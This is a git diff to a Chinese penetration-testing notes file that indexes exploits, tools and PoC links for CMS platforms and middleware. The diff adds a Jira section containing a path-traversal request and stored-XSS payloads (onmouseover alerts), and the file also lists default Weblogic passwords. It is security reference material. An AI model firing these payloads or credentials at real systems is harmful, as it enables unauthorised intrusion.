@@ -1,4 +1,4 @@
-# web 服务和中间件 vul 整合笔记
+# web 服务和中间件渗透笔记
 
 ---
 
@@ -8,21 +8,15 @@
 
 ---
 
-**文章**
-- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)
+# 各类论坛/CMS框架
+**什么是 CMS**
 
-**工具**
+内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在您的网站上提供的软件。 它有助于编辑,发布和修改网站的内容。
+
+**工具包**
 - [SecWiki/CMS-Hunter](https://github.com/SecWiki/CMS-Hunter)
 - [Q2h1Cg/CMS-Exploit-Framework](https://github.com/Q2h1Cg/CMS-Exploit-Framework)
 - [Lucifer1993/AngelSword](https://github.com/Lucifer1993/AngelSword)
-
----
-
-# 各类论坛/CMS框架
-
-**什么是内容管理系统 (CMS) **
-
-内容管理系统 (CMS) 是一种存储所有数据 (如文本,照片,音乐,文档等) 并在您的网站上提供的软件。 它有助于编辑,发布和修改网站的内容。
 
 ## dedeCMS
 **文章**
@@ -140,10 +134,11 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 - [ThinkPHP 5.x 远程命令执行漏洞利用过程](https://laucyun.com/a9142c328b103cd86a3715bd5073c4be.html)
 
 **工具**
-- [SkyBlueEternal/thinkphp-RCE-POC-Collection](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection)
+- [Lucifer1993/TPscan](https://github.com/Lucifer1993/TPscan)
 
 **资源**
 - [Mochazz/ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln)
+- [SkyBlueEternal/thinkphp-RCE-POC-Collection](https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection)
 
 ---
 
@@ -234,7 +229,11 @@ ECShop 是一款 B2C 独立网店系统,适合企业及个人快速构建个性�
 ---
 
 # 框架和中间件
-**toolkit**
+**文章**
+- [中间件漏洞合集](https://mp.weixin.qq.com/s/yN8lxwL-49OKfVR86JF01g)
+
+**工具包**
+- [1120362990/vulnerability-list](https://github.com/1120362990/vulnerability-list) - 在渗透测试中快速检测常见中间件、组件的高危漏洞。
 - [hatRiot/clusterd](https://github.com/hatRiot/clusterd)
 - [matthiaskaiser/jmet](https://github.com/matthiaskaiser/jmet) - Java Message Exploitation Tool
 
@@ -275,7 +274,7 @@ Apache ActiveMQ 是美国阿帕奇 (Apache) 软件基金会所研发的一套开
 
 ## Apache Solr
 
-Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发,主要基于 HTTP 和 Apache Lucene 实现。
+Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发,其主要功能包括全文检索、命中标示、分面搜索、动态聚类、数据库集成，以及富文本的处理。
 
 **资源**
 - [artsploit/solr-injection: Apache Solr Injection Research](https://github.com/artsploit/solr-injection)
@@ -291,7 +290,7 @@ Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发,�
 
 **CVE-2019-0192 Apache Solr RCE 5.0.0 to 5.5.5 and 6.0.0 to 6.6.5**
 - POC | Payload | exp
-    https://github.com/mpgn/CVE-2019-0192/
+    - https://github.com/mpgn/CVE-2019-0192/
 
 **CVE-2019-0193 Apache Solr 远程命令执行漏洞**
 - 简介
@@ -307,6 +306,9 @@ Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发,�
 
 - 文章
     - [Apache Solr最新漏洞复现](https://xz.aliyun.com/t/6679)
+
+- POC | Payload | exp
+    - [jas502n/solr_rce](https://github.com/jas502n/solr_rce)
 
 ---
 
@@ -409,7 +411,7 @@ Tomcat 默认端口为 8080,也可能被改为其他端口,后台管理路径为
 **CVE-2017-12615/12616**
 - 简介
 
-    2017年9月19日,Apache Tomcat 官方确认并修复了两个高危漏洞,漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0-7.80之间,官方评级为高危,在一定条件下,攻击者可以利用这两个漏洞,获取用户服务器上 JSP 文件的源代码,或是通过精心构造的攻击请求,向用户服务器上传恶意 JSP 文件,通过上传的 JSP 文件 ,可在用户服务器上执行任意代码,从而导致数据泄露或获取服务器权限,存在高安全风险。
+    2017年9月19日,Apache Tomcat 官方确认并修复了两个高危漏洞,漏洞 CVE 编号:CVE-2017-12615 和 CVE-2017-12616,该漏洞受影响版本为7.0.0-7.0.80之间,官方评级为高危,在一定条件下,攻击者可以利用这两个漏洞,获取用户服务器上 JSP 文件的源代码,或是通过精心构造的攻击请求,向用户服务器上传恶意 JSP 文件,通过上传的 JSP 文件 ,可在用户服务器上执行任意代码,从而导致数据泄露或获取服务器权限,存在高安全风险。
 
     - CVE-2017-12615：远程代码执行漏洞
 
@@ -739,6 +741,10 @@ windows 在创建一个新文件时,操作系统还会生成 8.3 格式的兼容
 
 - `http://<ip>:8080/jmx-console`
 
+**CVE-2017-12149**
+- POC | Payload | exp
+    - [yunxu1/jboss-_CVE-2017-12149](https://github.com/yunxu1/jboss-_CVE-2017-12149)
+
 ## PHP
 **CVE-2012-1823 PHPCGI 远程代码执行漏洞**
 - 影响版本
@@ -880,6 +886,7 @@ windows 在创建一个新文件时,操作系统还会生成 8.3 格式的兼容
 ---
 
 ## Weblogic
+
 `老版本 weblogic 有一些常见的弱口令,比如 weblogic、system、portaladmin 和 guest,Oracle@123 等,用户名密码交叉使用。`
 
 **工具**
@@ -1036,6 +1043,9 @@ FCKeditor/_samples/asp/sample04.asp
 
 ## 序列化
 ### fastjson
+**工具**
+- [wyzxxz/fastjson_rce_tool](https://github.com/wyzxxz/fastjson_rce_tool)
+
 **fastjson-1.2.22 到 fastjson-1.2.24 反序列化导致任意命令执行漏洞**
 - POC | Payload | exp
     - [fastjson 反序列化导致任意命令执行漏洞](https://vulhub.org/#/environments/fastjson/vuln/)
@@ -1107,6 +1117,43 @@ FCKeditor/_samples/asp/sample04.asp
 ---
 
 ## Jira
+
+jira 的 bug 漏洞参考 https://jira.atlassian.com/browse/JRASERVER-69858?filter=13085
+
+**CVE-2019-3403 信息泄露（用户名枚举）**
+- POC | Payload | exp
+    - https://blog.csdn.net/caiqiiqi/article/details/100094987
+
+**CVE-2019-8442 Jira 未授权敏感信息泄露**
+- 简介
+
+    Atlassian Jira是澳大利亚Atlassian公司的一套缺陷跟踪管理系统。该系统主要用于对工作中各类问题、缺陷进行跟踪管理。 Atlassian Jira 7.13.4之前版本、8.0.4之前版本和8.1.1之前版本中的CachingResourceDownloadRewriteRule类存在安全漏洞。远程攻击者可利用该漏洞访问Jira webroot中的文件。
+
+- POC | Payload | exp
+    - https://note.youdao.com/ynoteshare1/index.html?id=4189e6fb21fb097a4109ac22f33b16cb&type=note
+    - https://hackerone.com/reports/632808
+
+    `/s/thiscanbeanythingyouwant/_/META-INF/maven/com.atlassian.jira/atlassian-jira-webapp/pom.xml`
+
+**CVE-2019-8444 存储型XSS**
+- POC | Payload | exp
+    ```
+    POST /rest/api/2/issue/TEST-7/comment HTTP/1.1
+    Content-Type: application/json
+
+    {"body":"!image.png|width=\\\" οnmοuseοver=alert(333);//!"}
+    ```
+    ```
+    POST /rest/api/2/issue/TEST-7/comment HTTP/1.1
+    Content-Type: application/json
+
+    {"body":"!image.png|width=http://οnmοuseοver=alert(42&#x29;;//!"}
+    ```
+
+**CVE-2019-8446 信息泄露（用户名枚举）**
+- POC | Payload | exp
+    - https://talosintelligence.com/vulnerability_reports/TALOS-2019-0839
+
 **CVE-2019-8451 Jira 未授权 SSRF 漏洞**
 - 影响范围
 
